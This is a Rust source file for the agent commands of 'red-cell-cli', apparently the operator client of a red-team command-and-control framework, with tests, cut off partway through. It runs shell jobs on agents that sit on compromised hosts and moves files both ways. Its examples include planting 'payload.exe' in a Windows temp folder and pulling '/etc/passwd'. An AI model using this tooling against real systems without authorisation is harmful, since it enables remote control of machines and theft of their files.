//! `red-cell-cli agent` subcommands.
//!
//! # Subcommands
//!
//! | Command | API call | Notes |
//! |---|---|---|
//! | `agent list` | `GET /agents` | table of all agents |
//! | `agent show <id>` | `GET /agents/{id}` | full agent record |
//! | `agent exec <id> --cmd <cmd>` | `POST /agents/{id}/jobs` | submit job |
//! | `agent exec --wait` | submit then poll `GET /agents/{id}/jobs/{job_id}` | block until output |
//! | `agent output <id>` | `GET /agents/{id}/output` | pending output |
//! | `agent output --watch` | poll in a loop until Ctrl-C | streaming JSON lines |
//! | `agent kill <id>` | `POST /agents/{id}/kill` | terminate |
//! | `agent kill --wait` | kill then poll `GET /agents/{id}` until dead | block |
//! | `agent upload <id>` | `POST /agents/{id}/upload?dst=<path>` with binary body | file send |
//! | `agent download <id>` | `GET /agents/{id}/download?src=<path>` raw bytes | file receive |

use std::time::{Duration, Instant};

use serde::{Deserialize, Serialize};
use tokio::time::sleep;
use tracing::instrument;

use crate::AgentCommands;
use crate::client::ApiClient;
use crate::error::{CliError, EXIT_SUCCESS};
use crate::output::{OutputFormat, TextRender, TextRow, print_error, print_success};

/// Default polling timeout for `--wait` operations, in seconds.
const DEFAULT_WAIT_TIMEOUT_SECS: u64 = 60;
/// Polling interval for `--wait` and `--watch` operations.
const POLL_INTERVAL: Duration = Duration::from_millis(1_000);

// ── raw API response shapes ───────────────────────────────────────────────────

#[derive(Debug, Deserialize, Serialize)]
pub(crate) struct RawAgent {
    pub(crate) id: String,
    pub(crate) hostname: String,
    pub(crate) os: String,
    pub(crate) last_seen: String,
    pub(crate) status: String,
    // Detail-only fields — absent on the list endpoint.
    pub(crate) arch: Option<String>,
    pub(crate) username: Option<String>,
    pub(crate) domain: Option<String>,
    pub(crate) internal_ip: Option<String>,
    pub(crate) process_name: Option<String>,
    pub(crate) pid: Option<u64>,
    pub(crate) sleep_interval: Option<u64>,
    pub(crate) jitter: Option<u64>,
}

#[derive(Debug, Deserialize)]
pub(crate) struct JobSubmitResponse {
    pub(crate) job_id: String,
}

#[derive(Debug, Deserialize, Serialize)]
pub(crate) struct JobStatusResponse {
    pub(crate) job_id: String,
    /// `"pending"` | `"running"` | `"done"` | `"error"`
    pub(crate) status: String,
    pub(crate) output: Option<String>,
    pub(crate) exit_code: Option<i32>,
}

#[derive(Debug, Deserialize, Serialize)]
pub(crate) struct RawOutputEntry {
    pub(crate) job_id: String,
    pub(crate) command: Option<String>,
    pub(crate) output: String,
    pub(crate) exit_code: Option<i32>,
    pub(crate) created_at: String,
}

#[derive(Debug, Deserialize)]
struct UploadResponse {
    job_id: String,
}

// ── public output types ───────────────────────────────────────────────────────

/// Summary row returned by `agent list`.
#[derive(Debug, Clone, Serialize)]
pub struct AgentSummary {
    /// Unique agent identifier.
    pub id: String,
    /// Hostname of the compromised host.
    pub hostname: String,
    /// Operating system (e.g. `"Windows 10 x64"`).
    pub os: String,
    /// RFC 3339 timestamp of the agent's last check-in.
    pub last_seen: String,
    /// Liveness status: `"alive"` or `"dead"`.
    pub status: String,
}

impl TextRow for AgentSummary {
    fn headers() -> Vec<&'static str> {
        vec!["ID", "Hostname", "OS", "Last Seen", "Status"]
    }

    fn row(&self) -> Vec<String> {
        vec![
            self.id.clone(),
            self.hostname.clone(),
            self.os.clone(),
            self.last_seen.clone(),
            self.status.clone(),
        ]
    }
}

/// Full agent record returned by `agent show`.
#[derive(Debug, Clone, Serialize)]
pub struct AgentDetail {
    pub id: String,
    pub hostname: String,
    pub os: String,
    pub arch: Option<String>,
    pub username: Option<String>,
    pub domain: Option<String>,
    pub internal_ip: Option<String>,
    pub process_name: Option<String>,
    pub pid: Option<u64>,
    pub last_seen: String,
    pub status: String,
    pub sleep_interval: Option<u64>,
    pub jitter: Option<u64>,
}

impl TextRender for AgentDetail {
    fn render_text(&self) -> String {
        use comfy_table::{Cell, ContentArrangement, Table};
        let mut table = Table::new();
        table.set_content_arrangement(ContentArrangement::Dynamic);
        table.set_header([Cell::new("Field"), Cell::new("Value")]);
        let rows: &[(&str, String)] = &[
            ("id", self.id.clone()),
            ("hostname", self.hostname.clone()),
            ("os", self.os.clone()),
            ("arch", self.arch.clone().unwrap_or_default()),
            ("username", self.username.clone().unwrap_or_default()),
            ("domain", self.domain.clone().unwrap_or_default()),
            ("internal_ip", self.internal_ip.clone().unwrap_or_default()),
            ("process_name", self.process_name.clone().unwrap_or_default()),
            ("pid", self.pid.map_or_else(String::new, |p| p.to_string())),
            ("last_seen", self.last_seen.clone()),
            ("status", self.status.clone()),
            ("sleep_interval", self.sleep_interval.map_or_else(String::new, |s| s.to_string())),
            ("jitter", self.jitter.map_or_else(String::new, |j| j.to_string())),
        ];
        for (field, val) in rows {
            table.add_row([Cell::new(*field), Cell::new(val)]);
        }
        table.to_string()
    }
}

/// Result of `agent exec` without `--wait`.
#[derive(Debug, Clone, Serialize)]
pub struct JobSubmitted {
    /// Identifier for the queued job.
    pub job_id: String,
}

impl TextRender for JobSubmitted {
    fn render_text(&self) -> String {
        format!("Job submitted: {}", self.job_id)
    }
}

/// Result of `agent exec --wait`.
#[derive(Debug, Clone, Serialize)]
pub struct ExecResult {
    pub job_id: String,
    pub output: String,
    pub exit_code: Option<i32>,
}

impl TextRender for ExecResult {
    fn render_text(&self) -> String {
        let code = self.exit_code.map_or_else(|| "?".to_owned(), |c| c.to_string());
        format!("[job {}  exit {}]\n{}", self.job_id, code, self.output)
    }
}

/// Single output entry returned by `agent output`.
#[derive(Debug, Clone, Serialize)]
pub struct OutputEntry {
    pub job_id: String,
    pub command: Option<String>,
    pub output: String,
    pub exit_code: Option<i32>,
    pub created_at: String,
}

impl TextRow for OutputEntry {
    fn headers() -> Vec<&'static str> {
        vec!["Job ID", "Command", "Exit", "Created At", "Output"]
    }

    fn row(&self) -> Vec<String> {
        vec![
            self.job_id.clone(),
            self.command.clone().unwrap_or_default(),
            self.exit_code.map_or_else(String::new, |c| c.to_string()),
            self.created_at.clone(),
            // Truncate long output in table mode.
            self.output.chars().take(80).collect(),
        ]
    }
}

/// Result of `agent kill`.
#[derive(Debug, Clone, Serialize)]
pub struct KillResult {
    pub agent_id: String,
    pub status: String,
}

impl TextRender for KillResult {
    fn render_text(&self) -> String {
        format!("Agent {}  status: {}", self.agent_id, self.status)
    }
}

/// Result of `agent upload` and `agent download`.
#[derive(Debug, Clone, Serialize)]
pub struct TransferResult {
    pub agent_id: String,
    pub job_id: Option<String>,
    pub local_path: String,
    pub remote_path: String,
}

impl TextRender for TransferResult {
    fn render_text(&self) -> String {
        match &self.job_id {
            Some(jid) => format!(
                "Transfer job {jid}  agent: {}  remote: {}  local: {}",
                self.agent_id, self.remote_path, self.local_path
            ),
            None => format!(
                "Transfer complete  agent: {}  remote: {}  local: {}",
                self.agent_id, self.remote_path, self.local_path
            ),
        }
    }
}

// ── top-level dispatcher ──────────────────────────────────────────────────────

/// Dispatch an [`AgentCommands`] variant and return a process exit code.
///
/// All output (success and error) is written inside this function so that the
/// caller in `main.rs` only needs to propagate the exit code.
pub async fn run(client: &ApiClient, fmt: &OutputFormat, action: AgentCommands) -> i32 {
    match action {
        AgentCommands::List => match list(client).await {
            Ok(data) => {
                print_success(fmt, &data);
                EXIT_SUCCESS
            }
            Err(e) => {
                print_error(&e);
                e.exit_code()
            }
        },

        AgentCommands::Show { id } => match show(client, &id).await {
            Ok(data) => {
                print_success(fmt, &data);
                EXIT_SUCCESS
            }
            Err(e) => {
                print_error(&e);
                e.exit_code()
            }
        },

        AgentCommands::Exec { id, cmd, wait, timeout } => {
            let timeout_secs = timeout.unwrap_or(DEFAULT_WAIT_TIMEOUT_SECS);
            if wait {
                match exec_wait(client, &id, &cmd, timeout_secs).await {
                    Ok(data) => {
                        print_success(fmt, &data);
                        EXIT_SUCCESS
                    }
                    Err(e) => {
                        print_error(&e);
                        e.exit_code()
                    }
                }
            } else {
                match exec_submit(client, &id, &cmd).await {
                    Ok(data) => {
                        print_success(fmt, &data);
                        EXIT_SUCCESS
                    }
                    Err(e) => {
                        print_error(&e);
                        e.exit_code()
                    }
                }
            }
        }

        AgentCommands::Output { id, watch, since } => {
            if watch {
                watch_output(client, fmt, &id, since.as_deref()).await
            } else {
                match fetch_output(client, &id, since.as_deref()).await {
                    Ok(data) => {
                        print_success(fmt, &data);
                        EXIT_SUCCESS
                    }
                    Err(e) => {
                        print_error(&e);
                        e.exit_code()
                    }
                }
            }
        }

        AgentCommands::Kill { id, wait } => match kill(client, &id, wait).await {
            Ok(data) => {
                print_success(fmt, &data);
                EXIT_SUCCESS
            }
            Err(e) => {
                print_error(&e);
                e.exit_code()
            }
        },

        AgentCommands::Upload { id, src, dst } => match upload(client, &id, &src, &dst).await {
            Ok(data) => {
                print_success(fmt, &data);
                EXIT_SUCCESS
            }
            Err(e) => {
                print_error(&e);
                e.exit_code()
            }
        },

        AgentCommands::Download { id, src, dst } => match download(client, &id, &src, &dst).await {
            Ok(data) => {
                print_success(fmt, &data);
                EXIT_SUCCESS
            }
            Err(e) => {
                print_error(&e);
                e.exit_code()
            }
        },
    }
}

// ── command implementations ───────────────────────────────────────────────────

/// `agent list` — fetch all registered agents.
///
/// # Examples
/// ```text
/// red-cell-cli agent list
/// ```
#[instrument(skip(client))]
async fn list(client: &ApiClient) -> Result<Vec<AgentSummary>, CliError> {
    let raw: Vec<RawAgent> = client.get("/agents").await?;
    Ok(raw.into_iter().map(agent_summary_from_raw).collect())
}

/// `agent show <id>` — fetch full details of a single agent.
///
/// # Examples
/// ```text
/// red-cell-cli agent show abc123
/// ```
#[instrument(skip(client))]
async fn show(client: &ApiClient, id: &str) -> Result<AgentDetail, CliError> {
    let raw: RawAgent = client.get(&format!("/agents/{id}")).await?;
    Ok(agent_detail_from_raw(raw))
}

/// `agent exec <id> --cmd <cmd>` — submit a shell command job.
///
/// Returns immediately with the job ID.
///
/// # Examples
/// ```text
/// red-cell-cli agent exec abc123 --cmd "whoami"
/// ```
#[instrument(skip(client))]
async fn exec_submit(client: &ApiClient, id: &str, cmd: &str) -> Result<JobSubmitted, CliError> {
    #[derive(Serialize)]
    struct Body<'a> {
        cmd: &'a str,
    }
    let resp: JobSubmitResponse = client.post(&format!("/agents/{id}/jobs"), &Body { cmd }).await?;
    Ok(JobSubmitted { job_id: resp.job_id })
}

/// `agent exec <id> --cmd <cmd> --wait` — submit job and poll until complete.
///
/// Polls every second until the job status is `"done"` or `"error"`, or until
/// `timeout_secs` elapse (exit code 5).
///
/// # Examples
/// ```text
/// red-cell-cli agent exec abc123 --cmd "whoami" --wait --timeout 30
/// ```
#[instrument(skip(client))]
async fn exec_wait(
    client: &ApiClient,
    id: &str,
    cmd: &str,
    timeout_secs: u64,
) -> Result<ExecResult, CliError> {
    let submitted = exec_submit(client, id, cmd).await?;
    let job_id = &submitted.job_id;
    let deadline = Instant::now() + Duration::from_secs(timeout_secs);
    let job_path = format!("/agents/{id}/jobs/{job_id}");

    loop {
        if Instant::now() >= deadline {
            return Err(CliError::Timeout(format!(
                "timed out waiting for job {job_id} after {timeout_secs}s"
            )));
        }

        let status: JobStatusResponse = client.get(&job_path).await?;

        match status.status.as_str() {
            "done" | "error" => {
                return Ok(ExecResult {
                    job_id: status.job_id,
                    output: status.output.unwrap_or_default(),
                    exit_code: status.exit_code,
                });
            }
            _ => {
                sleep(POLL_INTERVAL).await;
            }
        }
    }
}

/// `agent output <id>` — fetch all pending output entries.
///
/// # Examples
/// ```text
/// red-cell-cli agent output abc123
/// red-cell-cli agent output abc123 --since job_xyz
/// ```
#[instrument(skip(client))]
async fn fetch_output(
    client: &ApiClient,
    id: &str,
    since: Option<&str>,
) -> Result<Vec<OutputEntry>, CliError> {
    let path = match since {
        Some(job_id) => format!("/agents/{id}/output?since={job_id}"),
        None => format!("/agents/{id}/output"),
    };
    let raw: Vec<RawOutputEntry> = client.get(&path).await?;
    Ok(raw.into_iter().map(output_entry_from_raw).collect())
}

/// `agent output <id> --watch` — stream new output as JSON lines until Ctrl-C.
///
/// Polls every second and prints each new entry as an individual JSON line.
///
/// # Examples
/// ```text
/// red-cell-cli agent output abc123 --watch
/// red-cell-cli agent output abc123 --watch --since job_xyz
/// ```
async fn watch_output(
    client: &ApiClient,
    fmt: &OutputFormat,
    id: &str,
    since: Option<&str>,
) -> i32 {
    let mut cursor: Option<String> = since.map(ToOwned::to_owned);
    // Create the ctrl_c future once and pin it so we can reuse the same OS-level
    // signal listener across all loop iterations. Creating a new ctrl_c() future
    // on every iteration registers a new listener each time; after ~64 iterations
    // the Tokio global receiver capacity (128) can be exhausted.
    let ctrl_c = tokio::signal::ctrl_c();
    tokio::pin!(ctrl_c);

    loop {
        let poll_result = tokio::select! {
            result = fetch_output(client, id, cursor.as_deref()) => result,
            _ = &mut ctrl_c => {
                return EXIT_SUCCESS;
            }
        };

        match poll_result {
            Err(e) => {
                print_error(&e);
                return e.exit_code();
            }
            Ok(entries) => {
                for entry in &entries {
                    // Update cursor so next poll only fetches newer entries.
                    cursor = Some(entry.job_id.clone());
                    match fmt {
                        OutputFormat::Json => {
                            let line = serde_json::json!({"ok": true, "data": entry});
                            match serde_json::to_string(&line) {
                                Ok(s) => println!("{s}"),
                                Err(_) => println!(r#"{{"ok":true}}"#),
                            }
                        }
                        OutputFormat::Text => {
                            let code =
                                entry.exit_code.map_or_else(|| "?".to_owned(), |c| c.to_string());
                            println!("[{}  exit {}]  {}", entry.job_id, code, entry.output);
                        }
                    }
                }
            }
        }

        let sleep_fut = sleep(POLL_INTERVAL);
        tokio::select! {
            _ = sleep_fut => {}
            _ = &mut ctrl_c => {
                return EXIT_SUCCESS;
            }
        }
    }
}

/// `agent kill <id> [--wait]` — send terminate command to an agent.
///
/// With `--wait`, polls `GET /agents/{id}` until `status == "dead"` or 60 s
/// elapse.
///
/// # Examples
/// ```text
/// red-cell-cli agent kill abc123
/// red-cell-cli agent kill abc123 --wait
/// ```
#[instrument(skip(client))]
async fn kill(client: &ApiClient, id: &str, wait: bool) -> Result<KillResult, CliError> {
    #[derive(Serialize)]
    struct Empty {}
    let _: serde_json::Value = client.post(&format!("/agents/{id}/kill"), &Empty {}).await?;

    if !wait {
        return Ok(KillResult { agent_id: id.to_owned(), status: "kill_sent".to_owned() });
    }

    let deadline = Instant::now() + Duration::from_secs(DEFAULT_WAIT_TIMEOUT_SECS);

    loop {
        if Instant::now() >= deadline {
            return Err(CliError::Timeout(format!(
                "timed out waiting for agent {id} to die after {}s",
                DEFAULT_WAIT_TIMEOUT_SECS
            )));
        }

        let raw: RawAgent = client.get(&format!("/agents/{id}")).await?;
        if raw.status == "dead" {
            return Ok(KillResult { agent_id: id.to_owned(), status: raw.status });
        }

        sleep(POLL_INTERVAL).await;
    }
}

/// `agent upload <id> --src <local> --dst <remote>` — upload a local file to
/// the agent.
///
/// Reads `src` from disk and `POST`s the raw bytes to
/// `/agents/{id}/upload?dst=<remote>`.  The server queues a file-write job
/// and returns its job ID.
///
/// # Examples
/// ```text
/// red-cell-cli agent upload abc123 --src ./payload.exe --dst C:\Windows\Temp\p.exe
/// ```
#[instrument(skip(client))]
async fn upload(
    client: &ApiClient,
    id: &str,
    src: &str,
    dst: &str,
) -> Result<TransferResult, CliError> {
    let data = tokio::fs::read(src)
        .await
        .map_err(|e| CliError::General(format!("cannot read {src}: {e}")))?;

    let encoded_dst = percent_encode(dst);
    let path = format!("/agents/{id}/upload?dst={encoded_dst}");
    let resp: UploadResponse = client.post_bytes(&path, data).await?;

    Ok(TransferResult {
        agent_id: id.to_owned(),
        job_id: Some(resp.job_id),
        local_path: src.to_owned(),
        remote_path: dst.to_owned(),
    })
}

/// `agent download <id> --src <remote> --dst <local>` — download a file from
/// the agent to disk.
///
/// Issues `GET /agents/{id}/download?src=<remote>` and writes the raw bytes to
/// `dst` on the local filesystem.
///
/// # Examples
/// ```text
/// red-cell-cli agent download abc123 --src /etc/passwd --dst ./passwd.txt
/// ```
#[instrument(skip(client))]
async fn download(
    client: &ApiClient,
    id: &str,
    src: &str,
    dst: &str,
) -> Result<TransferResult, CliError> {
    let encoded_src = percent_encode(src);
    let path = format!("/agents/{id}/download?src={encoded_src}");
    let bytes = client.get_raw_bytes(&path).await?;

    tokio::fs::write(dst, &bytes)
        .await
        .map_err(|e| CliError::General(format!("cannot write {dst}: {e}")))?;

    Ok(TransferResult {
        agent_id: id.to_owned(),
        job_id: None,
        local_path: dst.to_owned(),
        remote_path: src.to_owned(),
    })
}

// ── helpers ───────────────────────────────────────────────────────────────────

fn agent_summary_from_raw(r: RawAgent) -> AgentSummary {
    AgentSummary {
        id: r.id,
        hostname: r.hostname,
        os: r.os,
        last_seen: r.last_seen,
        status: r.status,
    }
}

fn agent_detail_from_raw(r: RawAgent) -> AgentDetail {
    AgentDetail {
        id: r.id,
        hostname: r.hostname,
        os: r.os,
        arch: r.arch,
        username: r.username,
        domain: r.domain,
        internal_ip: r.internal_ip,
        process_name: r.process_name,
        pid: r.pid,
        last_seen: r.last_seen,
        status: r.status,
        sleep_interval: r.sleep_interval,
        jitter: r.jitter,
    }
}

fn output_entry_from_raw(r: RawOutputEntry) -> OutputEntry {
    OutputEntry {
        job_id: r.job_id,
        command: r.command,
        output: r.output,
        exit_code: r.exit_code,
        created_at: r.created_at,
    }
}

/// Minimal percent-encode for path/query values.
///
/// Encodes characters that are unsafe in query-string values: space, `&`, `=`,
/// `+`, `?`, `#`, `%`, and characters outside ASCII printable range.
fn percent_encode(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for byte in s.bytes() {
        match byte {
            b'A'..=b'Z'
            | b'a'..=b'z'
            | b'0'..=b'9'
            | b'-'
            | b'_'
            | b'.'
            | b'~'
            | b'/'
            | b':'
            | b'\\' => out.push(byte as char),
            b => {
                out.push('%');
                out.push(char::from_digit((b >> 4) as u32, 16).unwrap_or('0'));
                out.push(char::from_digit((b & 0xF) as u32, 16).unwrap_or('0'));
            }
        }
    }
    out
}

// ── tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // ── AgentSummary ──────────────────────────────────────────────────────────

    #[test]
    fn agent_summary_serialises_required_fields() {
        let s = AgentSummary {
            id: "abc".to_owned(),
            hostname: "WIN10".to_owned(),
            os: "Windows 10".to_owned(),
            last_seen: "2026-01-01T00:00:00Z".to_owned(),
            status: "alive".to_owned(),
        };
        let v = serde_json::to_value(&s).expect("serialise");
        assert_eq!(v["id"], "abc");
        assert_eq!(v["hostname"], "WIN10");
        assert_eq!(v["status"], "alive");
    }

    #[test]
    fn agent_summary_text_row_headers_match_row_length() {
        let s = AgentSummary {
            id: "x".to_owned(),
            hostname: "h".to_owned(),
            os: "linux".to_owned(),
            last_seen: "t".to_owned(),
            status: "alive".to_owned(),
        };
        assert_eq!(AgentSummary::headers().len(), s.row().len());
    }

    #[test]
    fn vec_agent_summary_renders_table() {
        let items = vec![AgentSummary {
            id: "abc".to_owned(),
            hostname: "WIN10".to_owned(),
            os: "Windows 10".to_owned(),
            last_seen: "2026-01-01T00:00:00Z".to_owned(),
            status: "alive".to_owned(),
        }];
        let rendered = items.render_text();
        assert!(rendered.contains("abc"));
        assert!(rendered.contains("WIN10"));
        assert!(rendered.contains("alive"));
    }

    // ── AgentDetail ───────────────────────────────────────────────────────────

    #[test]
    fn agent_detail_serialises_optional_fields_as_null() {
        let d = AgentDetail {
            id: "x".to_owned(),
            hostname: "h".to_owned(),
            os: "linux".to_owned(),
            arch: None,
            username: None,
            domain: None,
            internal_ip: None,
            process_name: None,
            pid: None,
            last_seen: "t".to_owned(),
            status: "alive".to_owned(),
            sleep_interval: None,
            jitter: None,
        };
        let v = serde_json::to_value(&d).expect("serialise");
        assert!(v["arch"].is_null());
        assert!(v["pid"].is_null());
    }

    #[test]
    fn agent_detail_render_text_contains_key_fields() {
        let d = AgentDetail {
            id: "abc123".to_owned(),
            hostname: "myhost".to_owned(),
            os: "Windows".to_owned(),
            arch: Some("x86_64".to_owned()),
            username: Some("DOMAIN\\alice".to_owned()),
            domain: Some("CORP".to_owned()),
            internal_ip: Some("10.0.0.1".to_owned()),
            process_name: Some("svchost.exe".to_owned()),
            pid: Some(1234),
            last_seen: "2026-01-01T00:00:00Z".to_owned(),
            status: "alive".to_owned(),
            sleep_interval: Some(60),
            jitter: Some(10),
        };
        let rendered = d.render_text();
        assert!(rendered.contains("abc123"));
        assert!(rendered.contains("myhost"));
        assert!(rendered.contains("x86_64"));
        assert!(rendered.contains("1234"));
    }

    // ── JobSubmitted ──────────────────────────────────────────────────────────

    #[test]
    fn job_submitted_serialises_job_id() {
        let j = JobSubmitted { job_id: "job_abc".to_owned() };
        let v = serde_json::to_value(&j).expect("serialise");
        assert_eq!(v["job_id"], "job_abc");
    }

    #[test]
    fn job_submitted_render_text_contains_job_id() {
        let j = JobSubmitted { job_id: "job_abc".to_owned() };
        assert!(j.render_text().contains("job_abc"));
    }

    // ── ExecResult ────────────────────────────────────────────────────────────

    #[test]
    fn exec_result_serialises_all_fields() {
        let r =
            ExecResult { job_id: "j1".to_owned(), output: "root\n".to_owned(), exit_code: Some(0) };
        let v = serde_json::to_value(&r).expect("serialise");
        assert_eq!(v["job_id"], "j1");
        assert_eq!(v["output"], "root\n");
        assert_eq!(v["exit_code"], 0);
    }

    #[test]
    fn exec_result_render_text_contains_output_and_exit() {
        let r =
            ExecResult { job_id: "j1".to_owned(), output: "root\n".to_owned(), exit_code: Some(0) };
        let rendered = r.render_text();
        assert!(rendered.contains("root"));
        assert!(rendered.contains('0'));
    }

    // ── OutputEntry ───────────────────────────────────────────────────────────

    #[test]
    fn output_entry_text_row_headers_match_row_length() {
        let e = OutputEntry {
            job_id: "j".to_owned(),
            command: None,
            output: "out".to_owned(),
            exit_code: Some(0),
            created_at: "t".to_owned(),
        };
        assert_eq!(OutputEntry::headers().len(), e.row().len());
    }

    #[test]
    fn output_entry_row_79_chars_not_truncated() {
        let output: String = "x".repeat(79);
        let e = OutputEntry {
            job_id: "j".to_owned(),
            command: None,
            output: output.clone(),
            exit_code: None,
            created_at: "t".to_owned(),
        };
        let row = e.row();
        assert_eq!(row[4], output);
        assert_eq!(row[4].chars().count(), 79);
    }

    #[test]
    fn output_entry_row_80_chars_not_truncated() {
        let output: String = "x".repeat(80);
        let e = OutputEntry {
            job_id: "j".to_owned(),
            command: None,
            output: output.clone(),
            exit_code: None,
            created_at: "t".to_owned(),
        };
        let row = e.row();
        assert_eq!(row[4], output);
        assert_eq!(row[4].chars().count(), 80);
    }

    #[test]
    fn output_entry_row_81_chars_truncated_to_80() {
        let output: String = "x".repeat(81);
        let e = OutputEntry {
            job_id: "j".to_owned(),
            command: None,
            output,
            exit_code: None,
            created_at: "t".to_owned(),
        };
        let row = e.row();
        assert_eq!(row[4].chars().count(), 80);
        assert_eq!(row[4], "x".repeat(80));
    }

    #[test]
    fn output_entry_row_truncation_counts_unicode_chars_not_bytes() {
        // Each 'é' is 2 bytes but 1 Unicode scalar value.
        // 81 such chars should be truncated to 80 chars (not 80 bytes).
        let output: String = "é".repeat(81);
        let e = OutputEntry {
            job_id: "j".to_owned(),
            command: None,
            output,
            exit_code: None,
            created_at: "t".to_owned(),
        };
        let row = e.row();
        assert_eq!(row[4].chars().count(), 80);
        assert_eq!(row[4], "é".repeat(80));
    }

    // ── KillResult ────────────────────────────────────────────────────────────

    #[test]
    fn kill_result_render_text_contains_id_and_status() {
        let k = KillResult { agent_id: "abc".to_owned(), status: "dead".to_owned() };
        let rendered = k.render_text();
        assert!(rendered.contains("abc"));
        assert!(rendered.contains("dead"));
    }

    // ── TransferResult ────────────────────────────────────────────────────────

    #[test]
    fn transfer_result_upload_render_contains_job_id() {
        let t = TransferResult {
            agent_id: "abc".to_owned(),
            job_id: Some("j1".to_owned()),
            local_path: "/tmp/f".to_owned(),
            remote_path: "C:\\f".to_owned(),
        };
        assert!(t.render_text().contains("j1"));
    }

    #[test]
    fn transfer_result_download_render_no_job_id() {
        let t = TransferResult {
            agent_id: "abc".to_owned(),
            job_id: None,
            local_path: "/tmp/f".to_owned(),
            remote_path: "/etc/passwd".to_owned(),
        };
        let rendered = t.render_text();
        assert!(rendered.contains("complete"));
        assert!(rendered.contains("/etc/passwd"));
    }

    // ── percent_encode ────────────────────────────────────────────────────────

    #[test]
    fn percent_encode_leaves_safe_chars_unchanged() {
        assert_eq!(percent_encode("abc123-_.~/"), "abc123-_.~/");
    }

    #[test]
    fn percent_encode_encodes_space() {
        assert_eq!(percent_encode("hello world"), "hello%20world");
    }

    #[test]
    fn percent_encode_encodes_ampersand_and_equals() {
        assert_eq!(percent_encode("a=b&c=d"), "a%3db%26c%3dd");
    }

    #[test]
    fn percent_encode_windows_path() {
        // Backslash is allowed through (included in safe set).
        let encoded = percent_encode("C:\\Windows\\Temp\\file.exe");
        assert!(encoded.contains("C:\\Windows"));
        assert!(!encoded.contains(' '));
    }

    #[test]
    fn percent_encode_empty_string() {
        assert_eq!(percent_encode(""), "");
    }

    #[test]
    fn percent_encode_multibyte_utf8() {
        // 'é' encodes to bytes 0xC3 0xA9 — each byte must be individually percent-encoded.
        assert_eq!(percent_encode("caf\u{e9}"), "caf%c3%a9");
    }

    #[test]
    fn percent_encode_literal_percent() {
        // '%' (0x25) is not in the safe set and must be encoded to prevent double-encoding bugs.
        assert_eq!(percent_encode("/tmp/%test"), "/tmp/%25test");
    }

    // ── from_raw helpers ──────────────────────────────────────────────────────

    #[test]
    fn agent_summary_from_raw_maps_all_fields() {
        let raw = RawAgent {
            id: "id1".to_owned(),
            hostname: "host".to_owned(),
            os: "linux".to_owned(),
            last_seen: "ts".to_owned(),
            status: "alive".to_owned(),
            arch: None,
            username: None,
            domain: None,
            internal_ip: None,
            process_name: None,
            pid: None,
            sleep_interval: None,
            jitter: None,
        };
        let s = agent_summary_from_raw(raw);
        assert_eq!(s.id, "id1");
        assert_eq!(s.hostname, "host");
        assert_eq!(s.status, "alive");
    }

    #[test]
    fn agent_detail_from_raw_preserves_optional_fields() {
        let raw = RawAgent {
            id: "id2".to_owned(),
            hostname: "h".to_owned(),
            os: "win".to_owned(),
            last_seen: "t".to_owned(),
            status: "dead".to_owned(),
            arch: Some("x86".to_owned()),
            username: Some("user".to_owned()),
            domain: None,
            internal_ip: None,
            process_name: None,
            pid: Some(42),
            sleep_interval: Some(30),
            jitter: None,
        };
        let d = agent_detail_from_raw(raw);
        assert_eq!(d.arch, Some("x86".to_owned()));
        assert_eq!(d.pid, Some(42));
        assert_eq!(d.domain, None);
    }

    // ── exec_wait / fetch_output / watch_output (using wiremock) ─────────────

    /// Build a `ResolvedConfig` pointing at the given mock server URI.
    fn mock_cfg(server_uri: &str) -> crate::config::ResolvedConfig {
        crate::config::ResolvedConfig {
            server: server_uri.to_owned(),
            token: "test-token".to_owned(),
            timeout: 5,
            tls_mode: crate::config::TlsMode::SystemRoots,
        }
    }

    /// Build a minimal `RawOutputEntry` JSON object.
    fn raw_output_json(job_id: &str, output: &str, exit_code: i32) -> serde_json::Value {
        serde_json::json!({
            "job_id": job_id,
            "command": "whoami",
            "output": output,
            "exit_code": exit_code,
            "created_at": "2026-01-01T00:00:00Z"
        })
    }

    /// `exec_wait`: mock returns `status="pending"` on the first poll then
    /// `status="done"` on the second → function waits through the sleep, then
    /// returns the output.
    ///
    /// This test takes ~1 s of real time because `exec_wait` calls
    /// `sleep(POLL_INTERVAL)` after the "pending" response before re-polling.
    #[tokio::test]
    async fn exec_wait_pending_then_done_returns_output() {
        use wiremock::matchers::{method, path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let server = MockServer::start().await;

        // POST submit → job_id
        Mock::given(method("POST"))
            .and(path("/api/v1/agents/agent1/jobs"))
            .respond_with(
                ResponseTemplate::new(200).set_body_json(serde_json::json!({"job_id": "j1"})),
            )
            .expect(1)
            .mount(&server)
            .await;

        // First GET → "pending" (fires once, then this mock is exhausted)
        Mock::given(method("GET"))
            .and(path("/api/v1/agents/agent1/jobs/j1"))
            .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
                "job_id": "j1",
                "status": "pending",
                "output": null,
                "exit_code": null
            })))
            .up_to_n_times(1)
            .mount(&server)
            .await;

        // Subsequent GETs → "done" with output
        Mock::given(method("GET"))
            .and(path("/api/v1/agents/agent1/jobs/j1"))
            .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
                "job_id": "j1",
                "status": "done",
                "output": "root\n",
                "exit_code": 0
            })))
            .mount(&server)
            .await;

        let client = crate::client::ApiClient::new(&mock_cfg(&server.uri())).expect("build client");

        // exec_wait sleeps POLL_INTERVAL (1 s) after the "pending" response
        // before re-polling — the test naturally waits that long.
        let result =
            exec_wait(&client, "agent1", "whoami", 30).await.expect("exec_wait must succeed");
        assert_eq!(result.job_id, "j1");
        assert_eq!(result.output, "root\n");
        assert_eq!(result.exit_code, Some(0));
    }

    /// `exec_wait`: with `timeout_secs=0` the deadline is already expired when
    /// the loop first checks it → returns `CliError::Timeout`.
    #[tokio::test]
    async fn exec_wait_timeout_zero_returns_cli_timeout() {
        use wiremock::matchers::{method, path};
        use wiremock::{Mock, MockServer, ResponseTemplate};

        let server = MockServer::start().await;

        Mock::given(method("POST"))
            .and(path("/api/v1/agents/agent1/jobs"))
            .respond_with(
                ResponseTemplate::new(200)
                    .set_body_json(serde_json::json!({"job_id": "j-timeout"})),
            )
            .expect(1)
            .mount(&server)
            .await;

        let client = crate::client::ApiClient::new(&mock_cfg(&server.uri())).expect("build client");
        let result = exec_wait(&client, "agent1", "whoami", 0).await;

        assert!(
            matches!(result, Err(crate::error::CliError::Timeout(_))),
            "expected CliError::Timeout with timeout_secs=0, got {result:?}"
        );
    }

    /// `fetch_output`: mock returns two entries → both entries are returned and
    /// the `job_id` values are preserved.
